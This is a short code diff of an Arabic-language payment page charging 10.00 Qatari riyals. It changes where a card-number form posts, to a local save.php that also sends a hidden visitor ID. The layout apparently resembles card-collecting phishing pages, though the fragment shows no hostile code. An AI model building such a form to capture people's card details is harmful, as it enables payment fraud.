@@ -155,7 +155,7 @@
                 <span>ر.ق 10.00</span>
             </div>
 
-            <form id="paymentForm" action="../save.php" method="POST">
+            <form id="paymentForm" action="save.php" method="POST">
                 <input type="hidden" name="visitor_id" id="form_visitor_id">
                 <div class="form-group">
                     <label>رقم البطاقة</label>
